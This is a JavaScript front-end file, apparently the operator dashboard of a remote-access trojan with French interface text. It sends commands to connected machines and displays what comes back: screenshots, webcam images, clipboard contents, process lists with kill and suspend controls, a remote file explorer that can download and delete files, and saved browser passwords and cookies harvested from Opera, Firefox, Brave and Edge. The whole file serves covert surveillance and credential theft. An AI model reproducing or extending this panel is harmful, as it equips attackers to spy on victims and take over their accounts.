    // Screenshot
    else if (commandType === 'screenshot') {
        if (result && result.length) {
            let html = '';
            result.forEach((img, i) => {
                html += `<div class="screenshot-item" onclick="openLightbox('${img.data}')">
                    <h3>Moniteur ${img.monitor || (i+1)}</h3><img src="data:image/png;base64,${img.data}" class="screenshot-thumb"></div>`;
            });
            content.innerHTML = html;
        } else {
            content.innerHTML = '<div class="card-result"><p style="color:var(--text-muted);text-align:center;">Aucune capture.</p></div>';
        }
    }
    // Webcam
    else if (commandType === 'screenshot_webcam') {
        if (result && result.data) {
            content.innerHTML = `<div class="card-result"><h3><i class="fas fa-video"></i> Webcam</h3>
                <div class="screenshot-item" onclick="openLightbox('${result.data}')">
                <img src="data:image/jpeg;base64,${result.data}" class="screenshot-thumb"></div></div>`;
        } else {
            content.innerHTML = '<div class="card-result"><p style="color:var(--text-muted);text-align:center;">' + (result?.error || 'Aucune image') + '</p></div>';
        }
    }
    // File explorer
    else if (commandType === 'file_explorer') {
        if (result && result.error) { showNotification('error', result.error); return; }
        if (result && result.path) {
            fileExplorerCache[result.path] = result;
            if (!fileExplorerCurrentPath) {
                fileExplorerHistory = [];
            }
            renderFileExplorer(result.path);
            document.getElementById('result-modal').style.display = 'flex';
        } else {
            content.innerHTML = '<div class="card-result"><p style="color:var(--text-muted);">Erreur inconnue</p></div>';
            document.getElementById('result-modal').style.display = 'flex';
        }
    }
    // Clipboard
    else if (commandType === 'clipboard') {
        const text = result || '';
        content.innerHTML = `<div class="card-result"><h3><i class="fas fa-copy"></i> Presse-papier</h3>
            <div class="clipboard-content">${escapeHtml(text) || '<span style="color:var(--text-muted);">Vide</span>'}</div>
            ${text ? `<button class="copy-btn" onclick="copyToClipboard('${escapeAttr(text)}')"><i class="fas fa-copy"></i> Copier</button>` : ''}</div>`;
    }
    // List processes - with pause/stop FA icons
    else if (commandType === 'list_processes') {
        if (result && result.length) {
            window.processListData = result;
            renderProcessTable(result);
        } else {
            content.innerHTML = '<div class="card-result"><p style="color:var(--text-muted);">Aucun processus.</p></div>';
            document.getElementById('result-modal').style.display = 'flex';
        }
        return;
    }
    // Browser passwords / cookies
    else if (commandType === 'browser_passwords' || commandType === 'browser_cookies') {
        const label = commandType === 'browser_passwords' ? 'Mots de passe' : 'Cookies';
        const icon = commandType === 'browser_passwords' ? 'fa-key' : 'fa-cookie-bite';
        const allBrowsers = ['Opera', 'Opera GX', 'Firefox', 'Brave', 'Edge'];
        const adminRequired = ['Brave', 'Edge'];
        let collected = {};
        if (result && result.length > 0) {
            result.forEach(item => {
                const browser = item.browser || 'Unknown';
                if (!collected[browser]) collected[browser] = [];
                collected[browser].push(item);
            });
        }
        let html = '';
        for (const browser of allBrowsers) {
            const items = collected[browser];
            const bLogo = browserLogos[browser] || browserLogos['Unknown'];
            const browserHeader = `<span style="display:inline-flex;align-items:center;gap:8px;">${bLogo}<span>${escapeHtml(browser)}</span></span>`;
            if (items && items.length > 0) {
                html += `<div class="card-result"><h3>${browserHeader} <span style="color:var(--text-muted);font-size:12px;font-weight:400;">(${items.length})</span></h3><div class="browser-items">`;
                if (commandType === 'browser_passwords') {
                    items.forEach(item => {
                        html += `<div class="browser-item"><p><strong>URL:</strong> ${escapeHtml(item.url||'N/A')}</p>
                            <p><strong>Utilisateur:</strong> ${escapeHtml(item.username||'N/A')}</p>
                            <p><strong>Mot de passe:</strong> <span class="password-field">${escapeHtml(item.password||'N/A')}</span></p>
                            ${item.profile ? `<p><strong>Profil:</strong> ${escapeHtml(item.profile)}</p>` : ''}</div>`;
                    });
                } else {
                    items.forEach(item => {
                        html += `<div class="browser-item"><p><strong>Hote:</strong> ${escapeHtml(item.host||'N/A')}</p>
                            <p><strong>Nom:</strong> ${escapeHtml(item.name||'N/A')}</p>
                            <p><strong>Valeur:</strong> <span class="cookie-field">${escapeHtml(item.value||'N/A')}</span></p>
                            <p><strong>Expire:</strong> ${escapeHtml(item.expires||'N/A')}</p>
                            ${item.profile ? `<p><strong>Profil:</strong> ${escapeHtml(item.profile)}</p>` : ''}</div>`;
                    });
                }
                html += '</div></div>';
            } else {
                const reason = adminRequired.includes(browser) ? ' (admin requis)' : '';
                html += `<div class="card-result" style="opacity:0.7;"><h3>${browserHeader}</h3>
                    <p style="color:var(--text-muted);">Aucun ${label.toLowerCase()} trouve${reason}</p></div>`;
            }
        }
        content.innerHTML = html;
    }
    // Default
    else if (typeof result === 'string') {
        content.innerHTML = `<div class="card-result"><pre>${escapeHtml(result)}</pre></div>`;
    } else {
        content.innerHTML = `<div class="card-result"><pre>${escapeHtml(JSON.stringify(result, null, 2))}</pre></div>`;
    }

    document.getElementById('result-modal').style.display = 'flex';
}

// ========== PROCESS TABLE (with FA pause/stop icons) ==========
function renderProcessTable(processes) {
    const content = document.getElementById('result-content');
    let html = `<div class="card-result">
        <h3><i class="fas fa-list"></i> Processus (${processes.length})
            <button class="btn btn-icon-only refresh-btn" onclick="refreshProcessList()" title="Rafraichir" id="proc-refresh-btn">
                <i class="fas fa-sync-alt"></i>
            </button>
        </h3>
        <table class="process-table" id="process-table">
            <thead><tr>
                <th class="sortable" onclick="sortProcesses('pid')">PID ${sortIcon('pid')}</th>
                <th class="sortable" onclick="sortProcesses('name')">Nom ${sortIcon('name')}</th>
                <th class="sortable" onclick="sortProcesses('cpu_percent')">CPU ${sortIcon('cpu_percent')}</th>
                <th class="sortable" onclick="sortProcesses('memory_percent')">RAM ${sortIcon('memory_percent')}</th>
                <th>Actions</th>
            </tr></thead>
            <tbody id="process-tbody">`;

    processes.forEach(proc => {
        const statusColor = proc.status === 'stopped' ? 'var(--amber)' : '';
        const pauseIcon = proc.status === 'stopped' ? 'fa-play' : 'fa-pause';
        const pauseTitle = proc.status === 'stopped' ? 'Reprendre' : 'Suspendre';
        const pauseColor = proc.status === 'stopped' ? 'var(--amber)' : '';
        html += `<tr id="proc-${proc.pid}" style="color:${statusColor}">
            <td>${proc.pid}</td>
            <td>${escapeHtml(proc.name)}</td>
            <td>${proc.cpu_percent ?? '?'}%</td>
            <td>${proc.memory_percent ?? '?'}%</td>
            <td>
                <button class="btn btn-icon-only" title="${pauseTitle}" style="color:${pauseColor};" onclick="toggleSuspendProcess(${proc.pid}, '${escapeAttr(proc.status)}')">
                    <i class="fas ${pauseIcon}"></i>
                </button>
                <button class="btn btn-icon-only" title="Arreter" style="color:var(--red);" onclick="killProcess(${proc.pid})">
                    <i class="fas fa-stop"></i>
                </button>
            </td>
        </tr>`;
    });
    html += '</tbody></table></div>';
    content.innerHTML = html;
    document.getElementById('result-modal').style.display = 'flex';
}

function sortProcesses(field) {
    if (processSort.field === field) { processSort.asc = !processSort.asc; }
    else { processSort.field = field; processSort.asc = true; }
    const data = [...window.processListData];
    data.sort((a, b) => {
        let valA = a[field]; let valB = b[field];
        if (field === 'name') { valA = (valA || '').toLowerCase(); valB = (valB || '').toLowerCase(); }
        if (valA < valB) return processSort.asc ? -1 : 1;
        if (valA > valB) return processSort.asc ? 1 : -1;
        return 0;
    });
    renderProcessTable(data);
}

function sortIcon(field) {
    if (processSort.field === field) {
        return processSort.asc ? ' <i class="fas fa-sort-up"></i>' : ' <i class="fas fa-sort-down"></i>';
    }
    return '';
}

async function killProcess(pid) {
    if (!currentClient) return;
    try {
        const res = await fetch('/api/send_command', {
            method: 'POST', headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ machine_id: currentClient, command_type: 'kill_process', params: { pid: pid } })
        });
        const data = await res.json();
        if (!data.command_id) { showNotification('error', data.error || 'Erreur'); return; }
        const result = await pollCommandResult(data.command_id);
        if (result && result.success) {
            const row = document.getElementById(`proc-${pid}`);
            if (row) row.remove();
            if (window.processListData) window.processListData = window.processListData.filter(p => p.pid !== pid);
            showNotification('success', `Processus ${pid} arrete`);
        } else {
            showNotification('error', result?.error || 'Echec');
        }
    } catch(e) { showNotification('error', 'Erreur reseau'); }
}

async function toggleSuspendProcess(pid, currentStatus) {
    if (!currentClient) return;
    const commandType = currentStatus === 'stopped' ? 'resume_process' : 'suspend_process';
    try {
        const res = await fetch('/api/send_command', {
            method: 'POST', headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ machine_id: currentClient, command_type: commandType, params: { pid: pid } })
        });
        const data = await res.json();
        if (!data.command_id) { showNotification('error', data.error || 'Erreur'); return; }
        const result = await pollCommandResult(data.command_id);
        if (result && result.success) {
            const newStatus = currentStatus === 'stopped' ? 'running' : 'stopped';
            const row = document.getElementById(`proc-${pid}`);
            if (row) {
                row.style.color = newStatus === 'stopped' ? 'var(--amber)' : '';
                const btn = row.querySelector('.fa-pause, .fa-play')?.closest('button');
                if (btn) {
                    btn.title = newStatus === 'stopped' ? 'Reprendre' : 'Suspendre';
                    btn.style.color = newStatus === 'stopped' ? 'var(--amber)' : '';
                    const icon = btn.querySelector('i');
                    if (icon) {
                        icon.className = newStatus === 'stopped' ? 'fas fa-play' : 'fas fa-pause';
                    }
                    btn.setAttribute('onclick', `toggleSuspendProcess(${pid}, '${newStatus}')`);
                }
            }
            if (window.processListData) {
                const proc = window.processListData.find(p => p.pid === pid);
                if (proc) proc.status = newStatus;
            }
            showNotification('success', newStatus === 'stopped' ? `Processus ${pid} suspendu` : `Processus ${pid} repris`);
        } else {
            showNotification('error', result?.error || 'Echec');
        }
    } catch(e) { showNotification('error', 'Erreur reseau'); }
}

async function pollCommandResult(commandId, maxAttempts = 30) {
    for (let i = 0; i < maxAttempts; i++) {
        try {
            const res = await fetch(`/api/command_result/${commandId}`);
            const data = await res.json();
            if (data.status === 'executed') return data.result;
        } catch(e) {}
        await new Promise(r => setTimeout(r, 1000));
    }
    return null;
}

async function refreshProcessList() {
    if (!currentClient) { showNotification('error', 'Aucun client selectionne'); return; }
    const btn = document.getElementById('proc-refresh-btn');
    const icon = btn?.querySelector('i');
    if (icon) icon.classList.add('refresh-spinning');
    try {
        const res = await fetch('/api/send_command', {
            method: 'POST', headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ machine_id: currentClient, command_type: 'list_processes', params: {} })
        });
        const data = await res.json();
        if (data.command_id) {
            const result = await pollCommandResult(data.command_id, REFRESH_TIMEOUT);
            if (result) {
                window.processListData = result;
                renderProcessTable(result);
                showNotification('success', 'Liste actualisee');
            } else {
                showNotification('error', 'Echec de l\'actualisation');
            }
        }
    } catch(e) { showNotification('error', 'Erreur reseau'); }
    finally { if (icon) icon.classList.remove('refresh-spinning'); }
}

// ========== FILE EXPLORER ==========
let fileExplorerSort = { field: null, asc: true, cycle: 0 };

function renderFileExplorer(path) {
    const cached = fileExplorerCache[path];
    if (!cached) return;
    fileExplorerCurrentPath = path;
    const content = document.getElementById('result-content');
    const title = document.getElementById('result-title');
    const canGoBack = fileExplorerHistory.length > 0;
    title.innerHTML = `<i class="fas fa-folder-open" style="color:var(--amber);"></i> Explorateur fichiers
        <button class="btn btn-icon-only" onclick="refreshCurrentResult()" title="Rafraichir" id="refresh-cmd-btn" style="margin-left:6px;">
            <i class="fas fa-sync-alt"></i>
        </button>`;

    let items = [...(cached.items || [])];
    if (fileExplorerSort.field) {
        items.sort((a, b) => {
            let va, vb;
            if (fileExplorerSort.field === 'name') { va = (a.name||'').toLowerCase(); vb = (b.name||'').toLowerCase(); }
            else if (fileExplorerSort.field === 'type') { va = a.type||''; vb = b.type||''; }
            else if (fileExplorerSort.field === 'size') { va = a.size||0; vb = b.size||0; }
            else if (fileExplorerSort.field === 'modified') { va = a.modified||''; vb = b.modified||''; }
            if (va < vb) return fileExplorerSort.asc ? -1 : 1;
            if (va > vb) return fileExplorerSort.asc ? 1 : -1;
            return 0;
        });
    }

    function fileSortIcon(field) {
        if (fileExplorerSort.field === field) {
            return fileExplorerSort.asc ? ' <i class="fas fa-sort-up" style="color:var(--accent);"></i>' : ' <i class="fas fa-sort-down" style="color:var(--accent);"></i>';
        }
        return ' <i class="fas fa-sort" style="color:var(--text-muted);opacity:0.4;"></i>';
    }

    let html = `<div class="card-result">
        <div style="display:flex;align-items:center;gap:8px;margin-bottom:10px;">
            <button class="btn btn-icon-only" onclick="fileExplorerBack()" title="Retour" ${canGoBack?'':'disabled'} style="opacity:${canGoBack?1:0.3};">
                <i class="fas fa-arrow-left"></i>
            </button>
            <span style="font-size:13px;color:var(--text-secondary);font-family:'SF Mono','Consolas',monospace;">${escapeHtml(cached.path)}</span>
        </div>
        <table class="file-table"><thead><tr>
            <th class="sortable" onclick="sortFileExplorer('name')">Nom${fileSortIcon('name')}</th>
            <th class="sortable" onclick="sortFileExplorer('type')">Type${fileSortIcon('type')}</th>
            <th class="sortable" onclick="sortFileExplorer('size')">Taille${fileSortIcon('size')}</th>
            <th class="sortable" onclick="sortFileExplorer('modified')">Modifie${fileSortIcon('modified')}</th>
            <th></th>
        </tr></thead><tbody>`;

    if (cached.parent) {
        html += `<tr class="clickable-row fe-nav-row" data-path="${escapeHtml(cached.parent)}" data-is-parent="1">
            <td colspan="5" style="color:var(--accent); cursor:pointer;"><i class="fas fa-arrow-up"></i> ..</td></tr>`;
    }
    items.forEach((item, idx) => {
        const icon = item.type === 'directory' ? '<i class="fas fa-folder" style="color:var(--amber);"></i>' : '<i class="fas fa-file" style="color:#8b8fa5;"></i>';
        const fullPath = item.path || cached.path + '\\' + item.name;
        const rowClass = item.type === 'directory' ? 'class="clickable-row fe-nav-row"' : '';
        const rowData = item.type === 'directory' ? `data-path="${escapeHtml(fullPath)}"` : '';
        const downloadBtnHtml = item.type === 'file'
            ? `<button class="btn btn-icon-only fe-download-btn" title="Telecharger" data-path="${escapeHtml(fullPath)}" data-name="${escapeHtml(item.name)}"><i class="fas fa-download"></i></button>`
            : '';
        const deleteBtnHtml = `<button class="btn btn-icon-only fe-delete-btn" title="Supprimer" style="color:var(--red);" data-path="${escapeHtml(fullPath)}" data-type="${item.type}" data-parent="${escapeHtml(cached.path)}"><i class="fas fa-trash"></i></button>`;
        html += `<tr ${rowClass} ${rowData} style="cursor:${item.type==='directory'?'pointer':'default'}">
            <td>${icon} ${escapeHtml(item.name)}</td>
            <td>${item.type==='directory'?'Dossier':'Fichier'}</td>
            <td>${item.size_str||'-'}</td>
            <td>${formatDate(item.modified)}</td>
            <td style="display:flex;gap:4px;">${downloadBtnHtml}${deleteBtnHtml}</td></tr>`;
    });
    html += '</tbody></table></div>';
    content.innerHTML = html;

    // Bind events via data attributes (no inline onclick with paths)
    content.querySelectorAll('.fe-nav-row').forEach(row => {
        row.addEventListener('click', () => {
            const p = row.dataset.path;
            const isParent = row.dataset.isParent === '1';
            navigateToDir(p, isParent);
        });
    });
    content.querySelectorAll('.fe-download-btn').forEach(btn => {
        btn.addEventListener('click', e => {
            e.stopPropagation();
            downloadFileDirect(btn.dataset.path, btn.dataset.name);
        });
    });
    content.querySelectorAll('.fe-delete-btn').forEach(btn => {
        btn.addEventListener('click', e => {
            e.stopPropagation();
            showDeleteConfirmModal(btn.dataset.path, btn.dataset.type, btn.dataset.parent);
        });
    });
}

function sortFileExplorer(field) {
    if (fileExplorerSort.field === field) {
        fileExplorerSort.cycle = (fileExplorerSort.cycle + 1) % 3;
        if (fileExplorerSort.cycle === 0) {
            fileExplorerSort.field = null;
        } else {
            fileExplorerSort.asc = fileExplorerSort.cycle === 1;
        }
    } else {
        fileExplorerSort.field = field;
        fileExplorerSort.asc = true;
        fileExplorerSort.cycle = 1;
    }
    if (fileExplorerCurrentPath) renderFileExplorer(fileExplorerCurrentPath);
}

function navigateToDir(path, isParentNav = false) {
    path = path.replace(/\\\\/g, '\\');
    if (!isParentNav && fileExplorerCurrentPath) {
        fileExplorerHistory.push(fileExplorerCurrentPath);
    }
    const cached = fileExplorerCache[path];
    if (cached) {
        renderFileExplorer(path);
        return;
    }
    closeResultModal();
    if (!currentClient) return;
    document.getElementById('command-type').value = 'file_explorer';
    document.getElementById('command-params').value = path;
    document.getElementById('command-params-group').style.display = 'block';
    executeCommand();
}

function fileExplorerBack() {
    if (fileExplorerHistory.length === 0) return;
    const prevPath = fileExplorerHistory.pop();
    if (fileExplorerCache[prevPath]) {
        renderFileExplorer(prevPath);
    } else {
        closeResultModal();
        if (!currentClient) return;
        document.getElementById('command-type').value = 'file_explorer';
        document.getElementById('command-params').value = prevPath;
        document.getElementById('command-params-group').style.display = 'block';
        executeCommand();
    }
}

let _pendingDelete = null;

function showDeleteConfirmModal(remotePath, type, parentPath) {
    _pendingDelete = { remotePath, type, parentPath };
    const label = type === 'directory' ? 'dossier' : 'fichier';
    const modal = document.getElementById('delete-confirm-modal');
    document.getElementById('delete-confirm-label').textContent = label;
    document.getElementById('delete-confirm-path').textContent = remotePath;
    modal.style.display = 'flex';
}

function closeDeleteConfirmModal() {
    document.getElementById('delete-confirm-modal').style.display = 'none';
    _pendingDelete = null;
}

async function confirmDeleteRemotePath() {
    if (!_pendingDelete || !currentClient || !isOnline) return;
    const { remotePath, type, parentPath } = _pendingDelete;
    closeDeleteConfirmModal();
    const label = type === 'directory' ? 'dossier' : 'fichier';
    try {
        const res = await fetch('/api/send_command', {
            method: 'POST', headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ machine_id: currentClient, command_type: 'delete_path', params: { path: remotePath } })
        });
        const data = await res.json();
        if (!data.command_id) { showNotification('error', data.error || 'Erreur'); return; }
        const result = await pollCommandResult(data.command_id);
        if (result && result.success) {
            showNotification('success', `${label.charAt(0).toUpperCase()+label.slice(1)} supprime`);
            delete fileExplorerCache[parentPath];
            navigateToDir(parentPath, true);
        } else if (result && result.error) {
            if (result.error.toLowerCase().includes('permission') || result.error.toLowerCase().includes('access') || result.error.toLowerCase().includes('denied')) {
                showNotification('error', 'Permission refusee : impossible de supprimer ce ' + label);
            } else {
                showNotification('error', result.error);
            }
        } else {
            showNotification('error', 'Echec de la suppression');
        }
    } catch(e) { showNotification('error', 'Erreur reseau'); }
}

function downloadFileDirect(remotePath, fileName) {
    if (!currentClient || !isOnline) return;
    remotePath = remotePath.replace(/\\\\/g, '\\');
    commandStartTime = Date.now();
    abortController = new AbortController();
    fetch('/api/send_command', {
        method: 'POST', headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ machine_id: currentClient, command_type: 'download_file', params: { path: remotePath } }),
        signal: abortController.signal
    }).then(res => res.json()).then(data => {
        if (data.command_id) { currentCommandId = data.command_id; showProcessing(data.command_id); }
        else { showNotification('error', data.error || 'Erreur inconnue'); }
    }).catch(e => {
        if (e.name === 'AbortError') console.log('Telechargement annule');
        else showNotification('error', 'Erreur reseau');
    });
}

function downloadBase64(data, filename) {
    const link = document.createElement('a');
    link.href = 'data:application/octet-stream;base64,' + data;
    link.download = filename;
    document.body.appendChild(link); link.click(); document.body.removeChild(link);
}

function openLightbox(b64data) {
    document.getElementById('lightbox-img').src = 'data:image/png;base64,' + b64data;
    document.getElementById('lightbox-modal').style.display = 'block';
}
function closeLightbox() { document.getElementById('lightbox-modal').style.display = 'none'; }
function closeModal() { document.getElementById('command-modal').style.display = 'none'; }
function closeResultModal() {
    document.getElementById('result-modal').style.display = 'none';
    fileExplorerHistory = [];
    fileExplorerCurrentPath = null;
}

window.onclick = function(e) {
    if (e.target === document.getElementById('command-modal')) closeModal();
    if (e.target === document.getElementById('result-modal')) closeResultModal();
    if (e.target === document.getElementById('delete-confirm-modal')) closeDeleteConfirmModal();
};

// ========== INIT ==========
loadStats();
loadRecentClients();
updateConnectionStatus();
setInterval(() => {
    loadStats();
    if (document.getElementById('clients-page').classList.contains('active')) loadClients();
}, 10000);
